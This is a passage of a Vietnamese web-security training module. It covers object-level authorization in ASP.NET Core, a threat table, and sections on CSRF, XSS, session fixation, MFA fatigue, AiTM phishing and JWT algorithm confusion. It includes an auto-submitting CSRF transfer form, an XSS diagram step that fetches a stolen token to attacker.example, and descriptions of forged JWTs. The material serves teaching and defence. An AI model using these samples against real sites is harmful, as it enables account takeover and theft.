+  Chi->>API: GET /orders/2001 (đơn của chính Chi)
+  API-->>Chi: 200 OK
+  Note over Chi: Thử đổi ID trên URL
+  Chi->>API: GET /orders/1024 (đơn của An, Sales-HN)
+  alt API có lỗi BOLA
+    API->>DB: SELECT * FROM Orders WHERE Id=1024
+    API-->>Chi: 200 OK + dữ liệu đơn của An ❌
+  else API kiểm tra object-level
+    API->>DB: Tải order 1024
+    API->>API: AuthorizeAsync(Chi, order, Read) → fail
+    API-->>Chi: 403 hoặc 404 ✅
+  end
+</pre>
+<div class="caption">Token của Chi hoàn toàn hợp lệ và có scope orders.read — lỗi nằm ở việc thiếu kiểm tra ở mức object.</div>
+</div>
+<p><b>Phòng vệ:</b> mọi endpoint nhận ID phải gọi kiểm tra quyền trên object (resource-based authorization), hoặc lọc truy vấn theo người gọi (<code>WHERE OwnerId = @sub</code>). ID khó đoán (GUID) chỉ <b>giảm</b> khả năng dò, <b>không</b> thay thế kiểm tra quyền.</p>
+
+<h3 id="authz-code">B.6. Code ASP.NET Core: policy + resource-based authorization (deliverable 2)</h3>
+<p>Mở rộng từ <a href="lab.html#lab2">Lab 2</a>: thêm FallbackPolicy (deny by default), policy kết hợp scope + role, và handler fine-grained cho từng đơn hàng. Các API (<code>FallbackPolicy</code>, <code>IAuthorizationService.AuthorizeAsync</code>, <code>AuthorizationHandler&lt;TRequirement, TResource&gt;</code>, <code>OperationAuthorizationRequirement</code>) theo tài liệu <a href="https://learn.microsoft.com/aspnet/core/security/authorization/resource-based">Resource-based authorization</a> và <a href="https://learn.microsoft.com/aspnet/core/security/authorization/secure-data">Require authenticated users</a> trên Microsoft Learn.</p>
+<pre data-title="Program.cs"><code class="language-csharp">using System.Security.Claims;
+using Microsoft.AspNetCore.Authentication.JwtBearer;
+using Microsoft.AspNetCore.Authorization;
+
+var builder = WebApplication.CreateBuilder(args);
+
+builder.Services
+    .AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
+    .AddJwtBearer(o =&gt;
+    {
+        o.Authority = "http://localhost:8080/realms/demo";
+        o.Audience = "demo-api";
+        o.RequireHttpsMetadata = false;   // CHỈ dùng cho lab localhost
+        o.MapInboundClaims = false;       // giữ nguyên tên claim: sub, scope, roles...
+        o.TokenValidationParameters.RoleClaimType = "roles";   // claim do mapper của IdP tạo (tùy IdP)
+        o.TokenValidationParameters.NameClaimType = "preferred_username";
+        o.TokenValidationParameters.ValidAlgorithms = new[] { "RS256" }; // chặn alg lạ
+    });
+
+builder.Services.AddAuthorization(o =&gt;
+{
+    // 1) Deny by default: endpoint nào không khai báo policy vẫn yêu cầu đăng nhập
+    o.FallbackPolicy = new AuthorizationPolicyBuilder()
+        .RequireAuthenticatedUser()
+        .Build();
+
+    // 2) Coarse-grained: scope (client được ủy quyền gì)
+    o.AddPolicy("orders.read", p =&gt; p.RequireAssertion(ctx =&gt; HasScope(ctx.User, "orders.read")));
+
+    // 3) Coarse-grained: scope + role (client được phép VÀ user là Manager)
+    o.AddPolicy("orders.approve", p =&gt; p
+        .RequireAssertion(ctx =&gt; HasScope(ctx.User, "orders.write"))
+        .RequireRole("Manager"));
+});
+
+// 4) Fine-grained: handler theo tài nguyên Order
+builder.Services.AddSingleton&lt;IAuthorizationHandler, OrderAuthorizationHandler&gt;();
+builder.Services.AddScoped&lt;IOrderRepository, OrderRepository&gt;();
+
+var app = builder.Build();
+app.UseAuthentication();
+app.UseAuthorization();
+
+app.MapGet("/health", () =&gt; "ok").AllowAnonymous();   // công khai CÓ CHỦ ĐÍCH
+
+app.MapGet("/orders/{id:int}", async (int id, ClaimsPrincipal user,
+        IOrderRepository repo, IAuthorizationService authz) =&gt;
+    {
+        var order = await repo.FindAsync(id);
+        if (order is null) return Results.NotFound();
+
+        var result = await authz.AuthorizeAsync(user, order, OrderOperations.Read);
+        return result.Succeeded ? Results.Ok(order) : Results.Forbid();   // Forbid → 403
+    })
+    .RequireAuthorization("orders.read");
+
+app.MapPost("/orders/{id:int}/approve", async (int id, ClaimsPrincipal user,
+        IOrderRepository repo, IAuthorizationService authz) =&gt;
+    {
+        var order = await repo.FindAsync(id);
+        if (order is null) return Results.NotFound();
+
+        var result = await authz.AuthorizeAsync(user, order, OrderOperations.Approve);
+        if (!result.Succeeded) return Results.Forbid();
+
+        order.Approve(approvedBy: user.FindFirst("sub")!.Value);
+        await repo.SaveAsync(order);
+        return Results.NoContent();
+    })
+    .RequireAuthorization("orders.approve");
+
+app.Run();
+
+// Keycloak đặt nhiều scope trong MỘT claim "scope" cách nhau bởi dấu cách.
+// (Entra ID dùng claim "scp" cho delegated scope và "roles" cho app role.)
+static bool HasScope(ClaimsPrincipal user, string scope) =&gt;
+    user.FindAll("scope").SelectMany(c =&gt; c.Value.Split(' ')).Contains(scope);</code></pre>
+
+<pre data-title="OrderAuthorizationHandler.cs"><code class="language-csharp">using Microsoft.AspNetCore.Authorization;
+using Microsoft.AspNetCore.Authorization.Infrastructure;
+
+public static class OrderOperations
+{
+    public static readonly OperationAuthorizationRequirement Read    = new() { Name = nameof(Read) };
+    public static readonly OperationAuthorizationRequirement Approve = new() { Name = nameof(Approve) };
+}
+
+public sealed class OrderAuthorizationHandler
+    : AuthorizationHandler&lt;OperationAuthorizationRequirement, Order&gt;
+{
+    private const decimal ApprovalLimit = 50_000_000m;
+
+    protected override Task HandleRequirementAsync(
+        AuthorizationHandlerContext context,
+        OperationAuthorizationRequirement requirement,
+        Order order)
+    {
+        var userId    = context.User.FindFirst("sub")?.Value;
+        var dept      = context.User.FindFirst("department")?.Value;
+        var isManager = context.User.IsInRole("Manager");
+
+        if (userId is null) return Task.CompletedTask;   // không Succeed = deny
+
+        if (requirement.Name == OrderOperations.Read.Name)
+        {
+            if (order.OwnerId == userId)                              // ownership
+                context.Succeed(requirement);
+            else if (isManager &amp;&amp; order.Department == dept)           // RBAC + ABAC
+                context.Succeed(requirement);
+        }
+        else if (requirement.Name == OrderOperations.Approve.Name)
+        {
+            if (isManager
+                &amp;&amp; order.Department == dept        // cùng phòng ban
+                &amp;&amp; order.OwnerId != userId         // business rule: không tự duyệt
+                &amp;&amp; order.Status == OrderStatus.Pending
+                &amp;&amp; order.Amount &lt;= ApprovalLimit)  // business rule: hạn mức
+                context.Succeed(requirement);
+        }
+
+        return Task.CompletedTask;   // không gọi Succeed → requirement thất bại → deny
+    }
+}</code></pre>
+<div class="callout tip"><span class="callout-title">✅ Điểm cần nhớ khi đọc code</span>
+<ul>
+<li><b>Không gọi <code>context.Succeed</code></b> nghĩa là từ chối — deny by default ngay trong handler.</li>
+<li><code>[Authorize]</code>/<code>RequireAuthorization</code> được đánh giá <b>trước</b> khi tài nguyên được tải, nên không thể kiểm tra ownership; phải dùng <b>imperative</b> <code>AuthorizeAsync(user, resource, ...)</code> sau khi tải.</li>
+<li><code>MapInboundClaims = false</code> là bắt buộc để <code>FindFirst("sub")</code> hoạt động; nếu không, <code>sub</code> bị đổi thành <code>.../nameidentifier</code> (xem <a href="lab.html#lab2">Lab 2</a>).</li>
+<li>Claim <code>department</code>/<code>roles</code> phải do IdP phát hành (cấu hình mapper), <b>không</b> lấy từ request body.</li>
+</ul></div>
+
+<!-- ===================================================== -->
+<h2 id="threats">C. Threats và rủi ro phổ biến <span class="badge must">Must</span></h2>
+<p>Mục tiêu là <b>nhận diện rủi ro và thiết kế phòng vệ</b>, không phải thực hành tấn công. Bảng dưới tổng hợp mục tiêu của kẻ tấn công, dấu hiệu nhận biết và phòng vệ chính. Một số thuật ngữ dùng trong bảng:</p>
+<ul>
+<li><b>MITM</b> (Man-in-the-Middle — kẻ đứng giữa): nghe lén/sửa dữ liệu trên đường truyền.</li>
+<li><b>AiTM</b> (Adversary-in-the-Middle): biến thể MITM ở tầng ứng dụng — trang phishing đứng giữa người dùng và trang thật.</li>
+<li><b>CSP</b> (Content Security Policy): header HTTP khai báo trình duyệt được chạy script từ đâu.</li>
+<li><b>Rate limit / throttling</b>: giới hạn số request trong một khoảng thời gian.</li>
+<li><b>Sender-constrained token</b>: token gắn với khóa của client (vd <b>DPoP</b> — Demonstrating Proof of Possession, RFC 9449; hoặc mTLS — RFC 8705), bị lấy cắp cũng không dùng được nếu thiếu khóa.</li>
+<li><b>SIM swap</b>: kẻ gian thuyết phục nhà mạng chuyển số điện thoại của nạn nhân sang SIM mới của chúng.</li>
+</ul>
+<div class="table-wrap"><table>
+<thead><tr><th>Threat</th><th>Mục tiêu / cách làm</th><th>Dấu hiệu</th><th>Phòng vệ chính</th></tr></thead>
+<tbody>
+<tr><td><b>Brute force</b></td><td>Thử nhiều mật khẩu cho một account.</td><td>Nhiều lần sai liên tiếp cho cùng username.</td><td>Rate limit/throttling, khóa tạm hoặc risk control (CAPTCHA, chặn IP), MFA.</td></tr>
+<tr><td><b>Credential stuffing</b></td><td>Dùng cặp email/mật khẩu bị lộ từ dịch vụ khác.</td><td>Đăng nhập từ nhiều account, cùng IP/ASN, tỉ lệ thành công thấp nhưng đều.</td><td>MFA/passkey, phát hiện bất thường, kiểm tra mật khẩu với danh sách đã lộ (blocklist).</td></tr>
+<tr><td><b>Phishing</b></td><td>Lừa người dùng nhập credential/OTP vào trang giả.</td><td>Đăng nhập từ vị trí/thiết bị lạ ngay sau email đáng ngờ.</td><td>Phishing-resistant MFA (FIDO2/passkey), đào tạo, lọc email.</td></tr>
+<tr><td><b>Replay attack</b></td><td>Phát lại thông điệp/credential/token đã bắt được.</td><td>Cùng assertion/nonce dùng nhiều lần.</td><td><code>nonce</code>/challenge, timestamp, lifetime ngắn, lưu ID đã dùng (vd SAML <code>InResponseTo</code>, JWT <code>jti</code>), sender-constrained token (DPoP/mTLS).</td></tr>
+<tr><td><b>Session hijacking</b></td><td>Lấy session cookie/ID để mạo danh.</td><td>Cùng session từ IP/UA khác nhau.</td><td>Cookie <code>Secure</code>/<code>HttpOnly</code>/<code>SameSite</code>, TLS, chống XSS, rotate session ID sau login/đổi quyền, timeout.</td></tr>
+<tr><td><b>CSRF</b> (<a href="#csrf">chi tiết</a>)</td><td>Lợi dụng browser tự gửi cookie để thực hiện hành động thay nạn nhân.</td><td>Request thay đổi trạng thái với <code>Origin</code> lạ.</td><td><code>SameSite</code>, anti-CSRF token, kiểm tra <code>Origin</code>/<code>Referer</code>.</td></tr>
+<tr><td><b>XSS</b> (<a href="#xss">chi tiết</a>)</td><td>Chạy script độc trong origin của app.</td><td>Request ra domain lạ, CSP violation report.</td><td>Output encoding, CSP, sanitization, không để token ở nơi JS dễ đọc.</td></tr>
+<tr><td><b>Token theft / leakage</b></td><td>Lấy token qua log, URL, storage, telemetry, crash dump.</td><td>Token dùng từ nơi khác; token xuất hiện trong log.</td><td>Không log token, không đưa token vào URL, lifetime ngắn, secure storage, TLS, sender-constrained token.</td></tr>
+<tr><td><b>MITM</b></td><td>Nghe lén/sửa đường truyền.</td><td>Cảnh báo certificate, downgrade HTTP.</td><td>TLS đúng cấu hình, kiểm tra certificate (không tắt validation), HSTS.</td></tr>
+<tr><td><b>Open redirect / redirect URI abuse</b></td><td>Đưa authorization code/token tới endpoint của kẻ tấn công.</td><td><code>redirect_uri</code> lạ trong log của IdP.</td><td>Allowlist <code>redirect_uri</code> <b>khớp chính xác</b>, không wildcard, PKCE (<a href="m03-oauth-oidc.html#redirect-uri">M03</a>).</td></tr>
+<tr><td><b>JWT alg/key confusion</b> (<a href="#jwt-confusion">chi tiết</a>)</td><td>Giả token bằng <code>alg: none</code> hoặc ký HS256 bằng public key.</td><td>Token với <code>alg</code> bất thường.</td><td>Allowlist thuật toán, khóa gắn với thuật toán, dùng thư viện chuẩn (<a href="m02-crypto-session-token.html#jwt-validation">M02</a>).</td></tr>
+<tr><td><b>Account enumeration</b></td><td>Biết email nào có tài khoản (để phishing/stuffing).</td><td>Nhiều request login/reset với email khác nhau.</td><td>Thông báo lỗi chung (“email hoặc mật khẩu không đúng”), thời gian phản hồi đồng đều, rate limit.</td></tr>
+<tr><td><b>Recovery flow weakness</b></td><td>Đi đường vòng qua “quên mật khẩu” yếu hơn login.</td><td>Nhiều yêu cầu reset, đổi email/điện thoại ngay sau reset.</td><td>Recovery mạnh ngang login, link reset dùng 1 lần + hết hạn nhanh, thông báo cho user, không dùng câu hỏi bảo mật.</td></tr>
+<tr><td><b>Session fixation</b> (<a href="#session-fixation">chi tiết</a>)</td><td>Cài sẵn session ID cho nạn nhân trước khi họ đăng nhập.</td><td>Session ID không đổi trước/sau login.</td><td>Cấp session ID mới sau login, không nhận session ID từ URL.</td></tr>
+<tr><td><b>SIM swap / chặn SMS</b></td><td>Chiếm số điện thoại để nhận OTP.</td><td>User báo mất sóng, OTP gửi tới SIM mới.</td><td>SMS OTP chỉ là phương án dự phòng; ưu tiên app/passkey.</td></tr>
+<tr><td><b>MFA fatigue</b> (<a href="#mfa-fatigue">chi tiết</a>)</td><td>Spam push tới khi người dùng bấm “Chấp nhận”.</td><td>Nhiều push bị từ chối liên tiếp.</td><td>Number matching, hiển thị ngữ cảnh, giới hạn số push, báo cáo “không phải tôi”.</td></tr>
+<tr><td><b>AiTM phishing</b> (<a href="#aitm">chi tiết</a>)</td><td>Reverse proxy chuyển tiếp login thật, lấy session cookie <i>sau</i> MFA.</td><td>Session dùng từ IP khác ngay sau login; domain lạ.</td><td>FIDO2/passkey, conditional access, ràng buộc session với thiết bị, phát hiện bất thường.</td></tr>
+</tbody></table></div>
+
+<h3 id="csrf">C.1. CSRF — Cross-Site Request Forgery</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+CSRF (giả mạo request liên trang) giống việc kẻ gian <b>gửi một lá thư đã điền sẵn</b> “chuyển 10 triệu cho X” vào hộp thư công ty bạn, và nhân viên bưu điện tự động <b>đóng dấu của bạn</b> lên mọi thư gửi tới ngân hàng của bạn. Kẻ gian không cần biết con dấu (cookie) trông thế nào — chỉ cần lợi dụng việc nó được đóng tự động.</div>
+<p>Browser <b>tự động gửi cookie</b> của site A khi có request tới site A — kể cả khi request đó được khởi tạo từ trang của kẻ tấn công. Nếu app chỉ dựa vào cookie để xác thực, kẻ tấn công có thể khiến nạn nhân thực hiện hành động mà không biết.</p>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant V as Nạn nhân (Browser)
+  participant Bank as bank.example (đã đăng nhập)
+  participant Evil as evil.example
+  V->>Bank: Đăng nhập, nhận cookie session=abc
+  Note over V: Vẫn đang đăng nhập, mở tab khác
+  V->>Evil: Mở trang evil.example
+  Evil-->>V: HTML có form ẩn tự submit
+  V->>Bank: POST /transfer to=hacker, 10tr
+  Note over V,Bank: Browser tự gắn Cookie session=abc
+  Note over Bank: Cookie hợp lệ → server tưởng nạn nhân tự chuyển tiền
+  Bank-->>V: 200 OK ❌
+</pre>
+<div class="caption">CSRF: kẻ tấn công không đọc được cookie, chỉ “mượn” việc browser tự gửi cookie.</div>
+</div>
+<pre data-title="Trang evil.example (minh họa)"><code class="language-xml">&lt;form action="https://bank.example/transfer" method="POST" id="f"&gt;
+  &lt;input type="hidden" name="to" value="hacker"&gt;
+  &lt;input type="hidden" name="amount" value="10000000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById("f").submit();&lt;/script&gt;</code></pre>
+
+<div class="table-wrap"><table>
+<thead><tr><th>Giá trị <code>SameSite</code></th><th>Cookie được gửi trong request cross-site?</th><th>Ghi chú</th></tr></thead>
+<tbody>
+<tr><td><code>Strict</code></td><td>Không gửi trong mọi request cross-site (kể cả bấm link từ site khác).</td><td>An toàn nhất nhưng user bấm link từ email sẽ thấy như “chưa đăng nhập”.</td></tr>
+<tr><td><code>Lax</code></td><td>Chỉ gửi khi điều hướng top-level bằng method an toàn (GET bấm link); không gửi với POST form, fetch, iframe cross-site.</td><td>Cân bằng tốt. Trình duyệt Chromium mặc định coi cookie không khai báo <code>SameSite</code> là <code>Lax</code>; đừng dựa vào mặc định — khai báo rõ.</td></tr>
+<tr><td><code>None</code></td><td>Gửi trong mọi request (bắt buộc kèm <code>Secure</code>).</td><td>Cần cho kịch bản cross-site thật (embed, một số flow SSO) → phải có chống CSRF khác.</td></tr>
+</tbody></table></div>
+<div class="callout warn"><span class="callout-title">⚠️ SameSite không phải là tất cả</span>
+“Site” = scheme + registrable domain (vd <code>example.com</code>). <code>evil.example.com</code> (subdomain bị chiếm) là <b>same-site</b> với <code>app.example.com</code> → SameSite không chặn. Vì vậy vẫn nên kết hợp <b>anti-CSRF token</b> hoặc kiểm tra <code>Origin</code>, đặc biệt cho request thay đổi trạng thái. Và GET <b>không được</b> thay đổi trạng thái.</div>
+<p><b>Phòng vệ nhiều lớp:</b> (1) cookie <code>SameSite=Lax/Strict</code>; (2) <b>anti-forgery token</b> (synchronizer token hoặc double-submit) mà trang của kẻ tấn công không đọc được; (3) kiểm tra header <code>Origin</code>/<code>Referer</code>; (4) với SPA/BFF: yêu cầu custom header (vd <code>X-CSRF: 1</code>) — browser không cho trang cross-site gửi custom header mà không qua CORS preflight.</p>
+<pre data-title="Program.cs — antiforgery cho BFF/SPA gọi JSON API"><code class="language-csharp">builder.Services.AddAntiforgery(o =&gt; o.HeaderName = "X-XSRF-TOKEN");
+
+builder.Services.AddAuthentication().AddCookie(o =&gt;
+{
+    o.Cookie.Name = "__Host-app";                        // __Host-: Secure, Path=/, không Domain
+    o.Cookie.HttpOnly = true;
+    o.Cookie.SecurePolicy = CookieSecurePolicy.Always;
+    o.Cookie.SameSite = SameSiteMode.Lax;
+});
+
+var app = builder.Build();
+app.UseAuthentication();
+app.UseAntiforgery();   // .NET 8+: tự kiểm tra endpoint nhận form
+
+// Với JSON API, gọi kiểm tra tường minh cho các method thay đổi trạng thái:
+app.Use(async (ctx, next) =&gt;
+{
+    if (HttpMethods.IsPost(ctx.Request.Method) || HttpMethods.IsPut(ctx.Request.Method)
+        || HttpMethods.IsDelete(ctx.Request.Method) || HttpMethods.IsPatch(ctx.Request.Method))
+    {
+        var af = ctx.RequestServices.GetRequiredService&lt;IAntiforgery&gt;();
+        await af.ValidateRequestAsync(ctx);   // ném AntiforgeryValidationException nếu sai
+    }
+    await next();
+});</code></pre>
+<div class="callout info"><span class="callout-title">ℹ️ API chỉ dùng Bearer token có bị CSRF không?</span>
+Không theo cách cổ điển: browser <b>không tự</b> gắn header <code>Authorization</code>; JavaScript của bạn phải gắn. CSRF là vấn đề của <b>credential tự động gửi</b> (cookie, Basic auth đã lưu, Windows Integrated Auth). Đổi lại, token mà JS đọc được lại nhạy cảm với <a href="#xss">XSS</a> — xem <a href="#token-storage">token storage</a>.</div>
+
+<h3 id="xss">C.2. XSS — Cross-Site Scripting</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+XSS (chèn script liên trang) giống việc kẻ gian <b>trà trộn vào làm nhân viên</b> bên trong công ty bạn: hắn đọc được mọi giấy tờ trên bàn (localStorage), dùng điện thoại nội bộ gọi đi như người nhà (gọi API). Khóa két (HttpOnly) giúp hắn không mang được chìa đi, nhưng khi còn ở trong tòa nhà, hắn vẫn sai khiến được nhiều thứ.</div>
+<p>XSS xảy ra khi dữ liệu không tin cậy được chèn vào trang mà không encode, khiến script của kẻ tấn công chạy <b>trong origin của app</b>, với toàn bộ quyền của app: đọc DOM, đọc <code>localStorage</code>, gọi API.</p>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant H as Kẻ tấn công
+  participant App as SPA (app.example)
+  participant V as Browser nạn nhân
+  participant X as attacker.example
+  H->>App: Gửi bình luận chứa thẻ img onerror=script
+  V->>App: Mở trang có bình luận
+  App-->>V: HTML render bình luận KHÔNG encode
+  Note over V: Script chạy trong origin app.example
+  V->>V: Đọc token trong localStorage
+  V->>X: fetch(attacker.example/c?t=eyJ...)
+  Note over H,X: Kẻ tấn công dùng token từ máy khác,<br/>kể cả khi nạn nhân đã đóng tab
+</pre>
+<div class="caption">Token trong localStorage bị lấy đi và dùng lâu dài (đặc biệt nguy hiểm nếu là refresh token).</div>
+</div>
+<div class="dodont">
+<div class="do"><h5>✅ Ngăn XSS từ gốc</h5><ul><li>Output encoding theo ngữ cảnh (Razor, React mặc định encode).</li><li>Tránh <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>@Html.Raw</code> với dữ liệu người dùng; nếu bắt buộc → sanitize bằng thư viện chuẩn.</li><li>Content-Security-Policy chặn inline script và domain lạ.</li><li>Kiểm soát thư viện bên thứ ba (supply chain, Subresource Integrity).</li></ul></div>
+<div class="dont"><h5>❌ Sai lầm thường gặp</h5><ul><li>Nghĩ “dùng cookie HttpOnly là hết lo XSS” — script vẫn gọi API <i>từ chính browser nạn nhân</i>.</li><li>Lưu refresh token dài hạn trong <code>localStorage</code>.</li><li>Tự viết regex để lọc thẻ <code>&lt;script&gt;</code>.</li></ul></div>
+</div>
+<div class="table-wrap"><table>
+<thead><tr><th></th><th>CSRF</th><th>XSS</th></tr></thead>
+<tbody>
+<tr><td>Code của kẻ tấn công chạy ở đâu?</td><td>Trên site <b>khác</b> (evil.example)</td><td><b>Trong</b> origin của app</td></tr>
+<tr><td>Đọc được dữ liệu/response?</td><td>Không (chỉ gửi request “mù”)</td><td>Có — đọc DOM, storage, response</td></tr>
+<tr><td>Lợi dụng</td><td>Browser tự gửi cookie</td><td>Lỗi encode/sanitize</td></tr>
+<tr><td>Phòng vệ</td><td>SameSite, anti-CSRF token, Origin check</td><td>Encoding, CSP, sanitization</td></tr>
+<tr><td>Quan hệ</td><td colspan="2">XSS <b>phá được</b> mọi chống CSRF (script đọc được anti-CSRF token). Chống CSRF không giúp gì với XSS.</td></tr>
+</tbody></table></div>
+
+<h3 id="session-fixation">C.3. Session fixation</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+Kẻ gian <b>đưa sẵn cho bạn một tấm thẻ phòng khách sạn</b> mà hắn giữ bản sao, rồi dụ bạn ra lễ tân “kích hoạt” thẻ đó. Nếu lễ tân kích hoạt luôn tấm cũ thay vì <b>phát thẻ mới</b>, hắn cũng mở được phòng bạn.</div>
+<p>Kẻ tấn công khiến nạn nhân dùng một session ID <b>do kẻ tấn công biết trước</b>. Nếu sau khi nạn nhân đăng nhập, server vẫn giữ nguyên ID đó và gắn danh tính vào → kẻ tấn công dùng cùng ID là vào được tài khoản.</p>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant H as Kẻ tấn công
+  participant V as Nạn nhân
+  participant S as Web app
+  H->>S: Mở trang, nhận SESSIONID=X (chưa đăng nhập)
+  H->>V: Gửi link chứa SESSIONID=X
+  Note over H,V: Hoặc cài cookie qua subdomain bị chiếm
+  V->>S: Đăng nhập với SESSIONID=X
+  alt App lỗi: giữ nguyên ID
+    S-->>V: OK, session X giờ là của nạn nhân
+    H->>S: Dùng SESSIONID=X → vào tài khoản ❌
+  else App đúng: cấp ID mới sau login
+    S-->>V: Set-Cookie SESSIONID=Y (X bị hủy)
+    H->>S: Request với SESSIONID=X → chưa đăng nhập ✅
+  end
+</pre>
+</div>
+<p><b>Phòng vệ:</b> luôn cấp session ID mới sau login và khi thay đổi đặc quyền (vd vào chế độ admin), không chấp nhận session ID qua URL, dùng tiền tố cookie <code>__Host-</code> để subdomain không ghi đè cookie. Với ASP.NET Core cookie authentication, <code>SignInAsync</code> phát hành cookie xác thực mới; nhưng nếu bạn dùng thêm <code>ISession</code> để lưu dữ liệu nhạy cảm, hãy tự xóa/đổi session sau đăng nhập (xem <a href="m02-crypto-session-token.html#session-management">session management</a>).</p>
+
+<h3 id="mfa-fatigue">C.4. MFA fatigue (push bombing) và number matching</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+Kẻ gian đã có chìa khóa nhà bạn (mật khẩu), chỉ còn thiếu chuông cửa — hắn <b>bấm chuông liên tục lúc nửa đêm</b> đến khi bạn bực mình bấm “mở cửa” cho yên. <b>Number matching</b> giống việc bạn chỉ mở cửa khi người bấm chuông <b>đọc đúng mã số</b> đang hiện trên màn hình trước mặt bạn — kẻ gian ở xa không biết mã đó.</div>
+<p>Kẻ tấn công đã có mật khẩu (qua phishing/stuffing) và liên tục kích hoạt đăng nhập → điện thoại nạn nhân nhận hàng loạt push “Bạn có đang đăng nhập?”. Mệt mỏi hoặc nhầm lẫn, nạn nhân bấm <b>Approve</b>.</p>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant H as Kẻ tấn công (có mật khẩu)
+  participant IdP as IdP
+  participant P as Điện thoại nạn nhân
+  loop Lặp lại nhiều lần lúc nửa đêm
+    H->>IdP: Đăng nhập bằng mật khẩu đúng
+    IdP->>P: Push: Approve sign-in?
+    P-->>IdP: Deny
+  end
+  H->>IdP: Đăng nhập lần thứ N
+  IdP->>P: Push: Approve sign-in?
+  P-->>IdP: Approve (bấm cho yên) ❌
+  IdP-->>H: Đăng nhập thành công
+  Note over IdP,P: Number matching: màn hình login hiện số 47,<br/>user phải gõ 47 vào app.<br/>Nạn nhân không thấy màn hình login → không biết số
+</pre>
+</div>
+<p><b>Phòng vệ:</b> <b>number matching</b> (người dùng phải nhập số hiển thị trên màn hình đăng nhập — kẻ tấn công không thể khiến nạn nhân nhìn thấy số đó), hiển thị <b>ngữ cảnh</b> (ứng dụng, vị trí, IP), <b>giới hạn số push</b>/khóa tạm, nút “Báo cáo không phải tôi”, cảnh báo SOC khi nhiều push bị từ chối. Microsoft Authenticator đã bật number matching mặc định cho push MFA từ 2023. Lưu ý: number matching chặn fatigue nhưng <b>không</b> chặn AiTM (trang proxy hiển thị đúng số cho nạn nhân).</p>
+
+<h3 id="aitm">C.5. AiTM phishing — Adversary-in-the-Middle</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+Kẻ gian mở một <b>quầy giao dịch giả</b> ngay trước cửa ngân hàng, nhân viên giả chuyển mọi giấy tờ của bạn vào quầy thật và chuyển kết quả ra. Bạn đưa CCCD, đọc mã OTP — mọi thứ đều “thật”, nên ngân hàng đưa thẻ ra vào cho… nhân viên giả. <b>Passkey</b> giống tấm thẻ chỉ hoạt động khi <b>chính nó nhìn thấy</b> đúng địa chỉ ngân hàng thật — đứng ở quầy giả thì thẻ không chịu ký.</div>
+<p>Trang phishing không còn là form giả đơn giản mà là một <b>reverse proxy</b>: mọi thứ nạn nhân thấy là trang login <b>thật</b> được chuyển tiếp. Nạn nhân nhập mật khẩu, nhập OTP/bấm push như bình thường; IdP thật phát hành session cookie — và proxy <b>lấy luôn cookie đó</b>.</p>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant V as Nạn nhân
+  participant P as login-micros0ft.example (proxy AiTM)
+  participant IdP as IdP thật (login.microsoftonline.com)
+  V->>P: Bấm link trong email phishing
+  P->>IdP: Chuyển tiếp request
+  IdP-->>P: Trang login thật
+  P-->>V: Hiển thị y hệt trang thật
+  V->>P: Mật khẩu
+  P->>IdP: Mật khẩu
+  IdP-->>P: Yêu cầu MFA
+  P-->>V: Yêu cầu MFA
+  V->>P: Mã OTP / số matching / approve push
+  P->>IdP: Chuyển tiếp OTP
+  IdP-->>P: Set-Cookie session (đã qua MFA)
+  Note over P: Proxy lưu lại session cookie ❌
+  P-->>V: Chuyển nạn nhân tới trang thật như không có gì
+  P->>IdP: Dùng cookie đánh cắp → vào tài khoản
+</pre>
+<div class="caption">OTP và push đều bị chuyển tiếp “trong thời gian thực”, nên không chặn được AiTM.</div>
+</div>
+<div class="callout tip"><span class="callout-title">✅ Vì sao passkey/FIDO2 chặn được AiTM?</span>
+Khi đăng nhập WebAuthn, <b>browser</b> (không phải trang web) đưa <b>origin thực tế</b> mà nó đang truy cập vào dữ liệu được ký (<code>clientDataJSON.origin</code>), và authenticator chỉ dùng credential gắn với <b>RP ID</b> khớp domain.
+<ul>
+<li>Nạn nhân đang ở <code>login-micros0ft.example</code> → browser không tìm thấy passkey cho domain đó, hoặc chữ ký mang origin sai → IdP thật từ chối.</li>
+<li>Người dùng không thể “gõ nhầm” chữ ký vào trang giả như với OTP — không có bí mật nào để chuyển tiếp.</li>
+</ul>
+Chi tiết ở <a href="m05-enterprise-passwordless.html#webauthn">M05 — WebAuthn</a>.</div>
+<p><b>Biện pháp bổ sung</b> (khi chưa thể passkey cho mọi người): conditional access (chỉ cho thiết bị được quản lý/compliant), ràng buộc session/token với thiết bị (token binding, DPoP, cơ chế riêng của IdP), phát hiện đăng nhập bất thường (impossible travel, IP của hạ tầng proxy), session lifetime ngắn cho tài nguyên nhạy cảm và thu hồi session khi phát hiện.</p>
+
+<h3 id="jwt-confusion">C.6. JWT algorithm/key confusion và lỗi validation</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+Một tờ giấy tự ghi “<b>giấy này không cần con dấu</b>” (<code>alg: none</code>), hoặc tự ghi “<b>hãy kiểm tra tôi bằng cách khác</b>” (đổi thuật toán). Bảo vệ cẩn thận <b>không bao giờ</b> để chính tờ giấy quyết định cách kiểm tra nó — bảo vệ tự biết con dấu hợp lệ trông thế nào.</div>
+<p><b>JWT</b> (JSON Web Token) có header chứa <code>alg</code> — tên thuật toán ký. Lỗi xảy ra khi thư viện/ứng dụng <b>tin</b> giá trị <code>alg</code> do chính token khai báo.</p>
+<div class="grid cols-2">
+<div class="card bad"><h4><code>alg: none</code></h4><p>Kẻ tấn công sửa header thành <code>{"alg":"none"}</code>, bỏ chữ ký, đổi <code>roles</code> thành Admin. Thư viện lỏng lẻo chấp nhận token “không ký”.</p></div>
+<div class="card bad"><h4>RS256 → HS256</h4><p>API dùng <b>public key</b> RSA để verify. Kẻ tấn công ký token bằng HMAC (HS256) với <b>chính public key đó làm secret</b> (public key thì ai cũng có). Thư viện “chọn thuật toán theo header” sẽ verify HMAC bằng public key → khớp!</p></div>
+</div>
